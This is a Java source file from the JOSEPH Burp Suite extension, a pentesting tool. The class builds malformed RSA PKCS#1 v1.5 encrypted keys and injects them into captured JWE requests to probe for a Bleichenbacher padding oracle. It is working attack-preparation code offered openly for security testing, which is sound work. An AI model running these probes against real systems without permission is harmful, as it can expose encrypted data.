/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 * <p>
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * <p>
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks.bleichenbacher_pkcs1;

import burp.*;
import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
import eu.dety.burp.joseph.attacks.IAttackInfo;
import eu.dety.burp.joseph.utilities.*;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.json.simple.parser.JSONParser;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.swing.*;
import java.awt.*;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.Security;
import java.security.interfaces.RSAPublicKey;
import java.util.*;
import java.util.List;

/**
 * Bleichenbacher PKCS1 Attack Info
 * <p>
 * Class holding meta data for the Bleichenbacher RSA PKCS#1 v1.5 attack and for preparing all necessary parameter for the actual attack.
 * <p>
 * Attack vector generation based on and code (partly) taken from WS-Attacker
 * 
 * @see <a href="https://github.com/RUB-NDS/WS-Attacker">WS-Attacker</a>
 * 
 * @author Dennis Detering
 * @version 1.0
 */
public class BleichenbacherPkcs1Info implements IAttackInfo {
    private static final Logger loggerInstance = Logger.getInstance();
    private static final ResourceBundle bundle = ResourceBundle.getBundle("JOSEPH");

    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private JoseParameter parameter;
    private RSAPublicKey pubKey;

    // Unique identifier for the attack class
    private static final String id = "bleichenbarcher_pkcs1";

    // Full name of the attack
    private static final String name = "Bleichenbacher Million Message Attack";

    // Attack description
    private static final String description = "<html>The <em>Bleichenbacher RSA PKCS#1 v1.5</em> attack (aka. Million Message Attack) "
            + "exploits a vulnerability where the receiving party may be abused as validity oracle of the PKCS#1 v1.5 conformity.</html>";

    // Amount of requests needed
    private int amountRequests = 0;

    // Types of payload variation
    private enum PayloadType {
        ORIGINAL,
        NO_NULL_BYTE,
        NULL_BYTE_IN_PADDING,
        NULL_BYTE_IN_PKCS_PADDING,
        SYMMETRIC_KEY_OF_SIZE_8,
        SYMMETRIC_KEY_OF_SIZE_16,
        SYMMETRIC_KEY_OF_SIZE_24,
        SYMMETRIC_KEY_OF_SIZE_32,
        SYMMETRIC_KEY_OF_SIZE_40,
        WRONG_FIRST_BYTE,
        WRONG_SECOND_BYTE
    }

    // Hashmap of available payloads with a verbose name (including the
    // PayloadType)
    private static final HashMap<String, PayloadType> payloads = new HashMap<>();
    static {
        payloads.put(String.format("No Null Byte (0x%02X)", PayloadType.NO_NULL_BYTE.ordinal()), PayloadType.NO_NULL_BYTE);
        payloads.put(String.format("Null Byte in Padding (0x%02X)", PayloadType.NULL_BYTE_IN_PADDING.ordinal()), PayloadType.NULL_BYTE_IN_PADDING);
        payloads.put(String.format("Null Byte in PKCS Padding (0x%02X)", PayloadType.NULL_BYTE_IN_PKCS_PADDING.ordinal()),
                PayloadType.NULL_BYTE_IN_PKCS_PADDING);
        payloads.put(String.format("Symmetric Key of Size 8 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_8.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_8);
        payloads.put(String.format("Symmetric Key of Size 16 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_16.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_16);
        payloads.put(String.format("Symmetric Key of Size 24 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_24.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_24);
        payloads.put(String.format("Symmetric Key of Size 32 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_32.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_32);
        payloads.put(String.format("Symmetric Key of Size 40 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_40.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_40);
        payloads.put(String.format("Wrong First Byte (0x%02X)", PayloadType.WRONG_FIRST_BYTE.ordinal()), PayloadType.WRONG_FIRST_BYTE);
        payloads.put(String.format("Wrong Second Byte (0x%02X)", PayloadType.WRONG_SECOND_BYTE.ordinal()), PayloadType.WRONG_SECOND_BYTE);
    }

    // List of prepared requests with payload info
    private List<BleichenbacherPkcs1AttackRequest> requests = new ArrayList<>();

    private JComboBox<String> publicKeySelection;
    private JTextArea publicKey;

    public BleichenbacherPkcs1Info(IBurpExtenderCallbacks callbacks) {
        this.helpers = callbacks.getHelpers();
    }

    @Override
    public BleichenbacherPkcs1 prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo,
            JoseParameter parameter) throws AttackPreparationFailedException {
        this.requestResponse = requestResponse;
        this.parameter = parameter;

        this.requests.clear();

        String publicKeyValue = publicKey.getText();

        // Throw error if public key value is empty
        if (publicKeyValue.isEmpty()) {
            throw new AttackPreparationFailedException(bundle.getString("PROVIDE_PUBKEY"));
        }

        // Parse public key according to selected format
        int publicKeyFormat = publicKeySelection.getSelectedIndex();

        switch (publicKeyFormat) {
        // JWK (JSON)
            case 1:
                loggerInstance.log(getClass(), "Key format is JWK:  " + publicKeyValue, Logger.LogLevel.DEBUG);

                HashMap<String, PublicKey> publicKeys;

                try {
                    Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);

                    publicKeys = Converter.getRsaPublicKeysByJwkWithId(publickKeyValueJson);
                } catch (Exception e) {
                    loggerInstance.log(getClass(), "Error in prepareAttack (JWK):  " + e.getMessage(), Logger.LogLevel.ERROR);
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                }

                switch (publicKeys.size()) {
                // No suitable JWK in JWK Set found
                    case 0:
                        loggerInstance.log(getClass(), "Error in prepareAttack (JWK): No suitable JWK", Logger.LogLevel.ERROR);
                        throw new AttackPreparationFailedException(bundle.getString("NO_SUITABLE_JWK"));

                        // Exactly one suitable JWK found
                    case 1:
                        pubKey = (RSAPublicKey) publicKeys.entrySet().iterator().next().getValue();
                        break;

                    // More than one suitable JWK found. Provide dialog to select one.
                    default:
                        pubKey = (RSAPublicKey) Converter.getRsaPublicKeyByJwkSelectionPanel(publicKeys);
                }

                break;
            // PEM (String)
            default:
                pubKey = Converter.getRsaPublicKeyByPemString(publicKeyValue);
                if (pubKey == null) {
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                }
        }

        HashMap<PayloadType, byte[]> encryptedKeys;
        String[] components = Decoder.getComponents(this.parameter.getJoseValue());

        try {
            String encAlg = Decoder.getValueByBase64String(components[0], "enc").toUpperCase();
            encryptedKeys = generatePkcs1Vectors(pubKey, Crypto.getJoseKeyLengthByJoseAlgorithm(encAlg, 32));
        } catch (Exception e) {
            throw new AttackPreparationFailedException(e.getMessage());
        }

        // Prepare requests
        for (Map.Entry<PayloadType, byte[]> cek : encryptedKeys.entrySet()) {
            byte[] request = this.requestResponse.getRequest();
            components[1] = Decoder.base64UrlEncode(cek.getValue());

            String newComponentsConcatenated = Decoder.concatComponents(components);

            byte[] tmpRequest = JoseParameter.updateRequest(request, this.parameter, helpers, newComponentsConcatenated);

            requests.add(new BleichenbacherPkcs1AttackRequest(tmpRequest, cek.getKey().ordinal(), cek.getValue(), cek.getKey().name()));
            loggerInstance.log(getClass(), "Generated CEK: " + Decoder.base64UrlEncode(cek.getValue()), Logger.LogLevel.DEBUG);
        }

        this.amountRequests = requests.size();
        return new BleichenbacherPkcs1(callbacks, this);
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public String getDescription() {
        return description;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    @Override
    public boolean getExtraUI(JPanel extraPanel, GridBagConstraints constraints) {
        // Create combobox and textarea to add public key (in different formats)
        JLabel publicKeyLabel = new JLabel(bundle.getString("PUBKEY_FORMAT"));
        publicKeySelection = new JComboBox<>();
        DefaultComboBoxModel<String> publicKeySelectionListModel = new DefaultComboBoxModel<>();
        publicKey = new JTextArea(10, 50);
        publicKey.setLineWrap(true);

        publicKeySelectionListModel.addElement("PEM (String)");
        publicKeySelectionListModel.addElement("JWK (JSON)");

        publicKeySelection.setModel(publicKeySelectionListModel);

        constraints.gridy = 0;
        extraPanel.add(publicKeyLabel, constraints);

        constraints.gridy = 1;
        extraPanel.add(publicKeySelection, constraints);

        constraints.gridy = 2;
        JScrollPane jScrollPane = new javax.swing.JScrollPane();
        jScrollPane.setViewportView(publicKey);
        extraPanel.add(jScrollPane, constraints);

        return true;
    }

    @Override
    public boolean isSuitable(JoseParameter.JoseType type, String algorithm) {
        return (type == JoseParameter.JoseType.JWE && (algorithm.equals("RSA1_5")));
    }

    @Override
    public IHttpRequestResponse getRequestResponse() {
        return this.requestResponse;
    }

    @Override
    public List<BleichenbacherPkcs1AttackRequest> getRequests() {
        return this.requests;
    }

    @Override
    public HashMap<String, PayloadType> getPayloadList() {
        return payloads;
    }

    @Override
    public HashMap<String, String> updateValuesByPayload(Enum payloadTypeId, String header, String payload, String signature)
            throws AttackPreparationFailedException {
        return new HashMap<>();
    }

    /**
     * Get the public key
     * 
     * @return {@link RSAPublicKey} public key
     */
    public RSAPublicKey getPublicKey() {
        return this.pubKey;
    }

    /**
     * Get the parameter with the JOSE value
     * 
     * @return {@link IParameter} parameter
     */
    public JoseParameter getParameter() {
        return this.parameter;
    }

    /**
     * Generate different encrypted PKCS1 vectors
     * 
     * @param publicKey
     *            Public key
     * @param keySize
     *            Key size
     * @return Hashmap of encrypted padded keys and according payload type
     */
    private HashMap<PayloadType, byte[]> generatePkcs1Vectors(RSAPublicKey publicKey, int keySize) {
        // Generate random key
        Random random = new Random();
        byte[] keyBytes = new byte[keySize];
        random.nextBytes(keyBytes);

        int rsaKeyLength = publicKey.getModulus().bitLength() / 8;

        HashMap<PayloadType, byte[]> encryptedKeys = new HashMap<>();

        try {
            Security.addProvider(new BouncyCastleProvider());
            Cipher rsa = Cipher.getInstance("RSA/NONE/NoPadding");
            rsa.init(Cipher.ENCRYPT_MODE, publicKey);

            // create plain padded key and encrypt them
            encryptedKeys.put(PayloadType.NO_NULL_BYTE, rsa.doFinal(getEK_NoNullByte(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.NULL_BYTE_IN_PADDING, rsa.doFinal(getEK_NullByteInPadding(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.NULL_BYTE_IN_PKCS_PADDING, rsa.doFinal(getEK_NullByteInPkcsPadding(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_16, rsa.doFinal(getEK_SymmetricKeyOfSize16(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_24, rsa.doFinal(getEK_SymmetricKeyOfSize24(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_32, rsa.doFinal(getEK_SymmetricKeyOfSize32(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_40, rsa.doFinal(getEK_SymmetricKeyOfSize40(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_8, rsa.doFinal(getEK_SymmetricKeyOfSize8(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.WRONG_FIRST_BYTE, rsa.doFinal(getEK_WrongFirstByte(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.WRONG_SECOND_BYTE, rsa.doFinal(getEK_WrongSecondByte(rsaKeyLength, keyBytes)));
            encryptedKeys.put(PayloadType.ORIGINAL, rsa.doFinal(getPaddedKey(rsaKeyLength, keyBytes)));

        } catch (BadPaddingException | IllegalBlockSizeException | InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException e) {
            loggerInstance.log(getClass(), "Error during key encryption: " + e.getMessage(), Logger.LogLevel.ERROR);
        }

        return encryptedKeys;
    }

    /**
     * Generate a validly padded message
     * 
     * @param rsaKeyLength
     *            rsa key length in bytes
     * @param symmetricKey
     *            symmetric key in bytes
     * @return The padded key
     */
    private static byte[] getPaddedKey(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = new byte[rsaKeyLength];
        // fill all the bytes with non-zero values
        Arrays.fill(key, (byte) 42);
        // set the first byte to 0x00
        key[0] = 0x00;
        // set the second byte to 0x02
        key[1] = 0x02;
        // set the separating byte
        key[rsaKeyLength - symmetricKey.length - 1] = 0x00;
        // copy the symmetric key to the field
        System.arraycopy(symmetricKey, 0, key, rsaKeyLength - symmetricKey.length, symmetricKey.length);

        return key;
    }

    private static byte[] getEK_NoNullByte(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);

        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with no separating byte.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_WrongFirstByte(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[0] = 23;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong first byte.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_WrongSecondByte(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[1] = 23;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong second byte.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_NullByteInPkcsPadding(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[3] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a 0x00 byte in the PKCS1 padding.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_NullByteInPadding(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[11] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a 0x00 byte in padding.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize40(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[rsaKeyLength - 40 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 40.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize32(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);

        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        key[rsaKeyLength - 32 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 32.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize24(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);

        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        key[rsaKeyLength - 24 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 24.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize16(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);

        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        key[rsaKeyLength - 16 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 16.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize8(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);

        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        key[rsaKeyLength - 8 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 8.", Logger.LogLevel.DEBUG);
        return key;
    }

}
